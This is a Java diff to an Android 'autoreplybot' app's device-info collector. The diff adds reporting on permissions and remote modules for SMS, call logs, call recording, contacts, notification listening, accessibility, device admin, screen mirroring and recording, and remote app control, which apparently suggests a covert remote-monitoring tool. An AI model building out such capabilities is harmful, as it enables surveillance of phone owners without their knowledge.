@@ -1,5 +1,6 @@
 package com.autoreplybot.remote;
 
+import android.Manifest;
 import android.app.ActivityManager;
 import android.content.Context;
 import android.content.Intent;
@@ -30,6 +31,7 @@ import com.autoreplybot.BuildConfig;
 import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
@@ -39,7 +41,7 @@ import java.util.TimeZone;
  * Collects legally accessible device information. Never collects IMEI, serial, MAC, ADID, etc.
  */
 public final class RemoteDeviceInfoCollector {
-    public static final int SCHEMA_VERSION = 1;
+    public static final int SCHEMA_VERSION = 2;
 
     private RemoteDeviceInfoCollector() {}
 
@@ -340,26 +342,52 @@ public final class RemoteDeviceInfoCollector {
 
     @NonNull
     private static Map<String, Object> permissions(@NonNull Context app) {
-        Map<String, Object> m = new HashMap<>();
-        m.put("camera", perm(app, android.Manifest.permission.CAMERA));
-        m.put("microphone", perm(app, android.Manifest.permission.RECORD_AUDIO));
-        m.put("fineLocation", perm(app, android.Manifest.permission.ACCESS_FINE_LOCATION));
-        m.put("coarseLocation", perm(app, android.Manifest.permission.ACCESS_COARSE_LOCATION));
+        Map<String, Object> m = new LinkedHashMap<>();
+        m.put("camera", status(RemotePermissionChecks.hasCamera(app)));
+        m.put("microphone", status(RemotePermissionChecks.hasMicrophone(app)));
+        m.put("fineLocation", status(RemotePermissionChecks.hasFineLocation(app)));
+        m.put("coarseLocation", status(RemotePermissionChecks.hasCoarseLocation(app)));
         if (Build.VERSION.SDK_INT >= 29) {
-            m.put("backgroundLocation", perm(app, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION));
+            m.put("backgroundLocation", status(RemotePermissionChecks.hasBackgroundLocation(app)));
         } else {
-            m.put("backgroundLocation", "Not available on this Android version");
+            m.put("backgroundLocation", "n/a");
         }
         if (Build.VERSION.SDK_INT >= 33) {
-            m.put("notifications", perm(app, android.Manifest.permission.POST_NOTIFICATIONS));
-            m.put("readImages", perm(app, android.Manifest.permission.READ_MEDIA_IMAGES));
-            m.put("readVideo", perm(app, android.Manifest.permission.READ_MEDIA_VIDEO));
-            m.put("readAudio", perm(app, android.Manifest.permission.READ_MEDIA_AUDIO));
+            m.put("readImages", perm(app, Manifest.permission.READ_MEDIA_IMAGES));
+            m.put("readVideo", perm(app, Manifest.permission.READ_MEDIA_VIDEO));
+            m.put("readAudio", perm(app, Manifest.permission.READ_MEDIA_AUDIO));
+            m.put("readStorage", "n/a");
         } else {
-            m.put("notifications", "Not available on this Android version");
-            m.put("readStorage", perm(app, android.Manifest.permission.READ_EXTERNAL_STORAGE));
+            m.put("readImages", "n/a");
+            m.put("readVideo", "n/a");
+            m.put("readAudio", "n/a");
+            m.put("readStorage", perm(app, Manifest.permission.READ_EXTERNAL_STORAGE));
+        }
+        m.put("contacts", status(RemotePermissionChecks.hasContactsAccess(app)));
+        m.put("sms", status(RemotePermissionChecks.hasSmsAccess(app)));
+        m.put("receiveSms", perm(app, Manifest.permission.RECEIVE_SMS));
+        m.put("callLog", status(RemotePermissionChecks.hasCallLogAccess(app)));
+        m.put("phoneState", perm(app, Manifest.permission.READ_PHONE_STATE));
+        m.put("outgoingCalls", perm(app, Manifest.permission.PROCESS_OUTGOING_CALLS));
+        m.put("callRecordingReady", status(RemotePermissionChecks.hasCallRecordingReady(app)));
+        m.put("notificationListener", status(RemotePermissionChecks.hasNotificationListener(app)));
+        m.put("usageAccess", status(RemoteAppUsageMirror.hasUsageAccess(app)));
+        m.put("folderAccess", status(RemotePermissionChecks.hasFolderAccess(app)));
+        m.put("accessibility", status(RemoteAppBlockManager.isAccessibilityEnabled(app)));
+        m.put("deviceAdmin", status(RemoteAppBlockManager.isDeviceAdminActive(app)));
+        if (Build.VERSION.SDK_INT >= 23) {
+            PowerManager pm = (PowerManager) app.getSystemService(Context.POWER_SERVICE);
+            boolean ignored = pm != null && pm.isIgnoringBatteryOptimizations(app.getPackageName());
+            m.put("batteryOptimizationIgnored", status(ignored));
+        } else {
+            m.put("batteryOptimizationIgnored", "n/a");
         }
         return m;
+    }
+
+    @NonNull
+    private static String status(boolean granted) {
+        return granted ? "granted" : "denied";
     }
 
     @NonNull
@@ -374,12 +402,20 @@ public final class RemoteDeviceInfoCollector {
         RemoteControlPrefs prefs = new RemoteControlPrefs(app);
         RemoteModulePrefs modules = new RemoteModulePrefs(app);
         m.put("remoteControlEnabled", prefs.isRemoteControlEnabled());
-        m.put("notificationListenerEnabled", modules.isNotificationMirrorEnabled());
         m.put("locationSharingEnabled", modules.isLocationSharingEnabled());
         m.put("galleryAccessEnabled", modules.isGalleryEnabled());
         m.put("notificationMirrorEnabled", modules.isNotificationMirrorEnabled());
         m.put("messagesSharingEnabled", modules.isMessagesSharingEnabled());
+        m.put("callLogsSharingEnabled", modules.isCallLogsSharingEnabled());
+        m.put("contactsSharingEnabled", modules.isContactsSharingEnabled());
         m.put("fileManagerEnabled", modules.isFileManagerEnabled());
+        m.put("screenMirrorEnabled", modules.isScreenMirrorEnabled());
+        m.put("screenRecordEnabled", modules.isScreenRecordEnabled());
+        m.put("installedAppsSharingEnabled", modules.isInstalledAppsSharingEnabled());
+        m.put("appUsageSharingEnabled", modules.isAppUsageSharingEnabled());
+        m.put("appControlEnabled", modules.isAppControlEnabled());
+        m.put("remoteAccessibilityEnabled",
+                new RemoteAccessibilityPrefs(app).isAccessibilityControlEnabled());
         m.put("fcmTokenPresent", !prefs.getFcmToken().isEmpty());
         m.put("lastSyncAt", System.currentTimeMillis());
         return m;
